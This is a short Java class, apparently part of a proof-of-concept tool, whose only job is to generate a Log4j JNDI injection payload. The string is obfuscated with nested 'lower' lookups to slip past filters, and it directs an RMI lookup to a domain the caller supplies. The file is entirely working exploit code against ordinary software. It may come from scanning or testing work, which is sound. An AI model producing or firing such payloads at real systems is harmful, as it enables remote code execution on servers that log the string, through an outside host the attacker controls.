package cn.xxx.poc.impl;

import cn.xxx.poc.IPOC;

public class POC5 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${${lower:${lower:jndi}}:${lower:rmi}://" + domain + "/}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}
